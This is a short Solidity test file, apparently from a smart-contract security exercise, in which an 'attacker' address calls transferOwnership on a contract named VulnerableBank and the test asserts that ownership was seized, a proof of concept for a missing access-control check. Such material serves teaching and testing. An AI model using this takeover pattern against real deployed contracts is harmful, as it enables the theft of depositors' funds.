// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract TestVulnerableBank is BaseTestWithBalanceLog {
    VulnerableBank target;

    function setUp() public {
        target = new VulnerableBank();
        vm.prank(deployedWallet);
        target.deposit{value: 1 ether}();
    }

    function testExploit() public {
        address attacker = makeAddr("attacker");
        vm.prank(attacker);

        // Step 1: Transfer ownership to the attacker
        target.transferOwnership(attacker);

        // Validation: Check if ownership is transferred successfully
        assertEq(target.owner(), attacker);
    }
}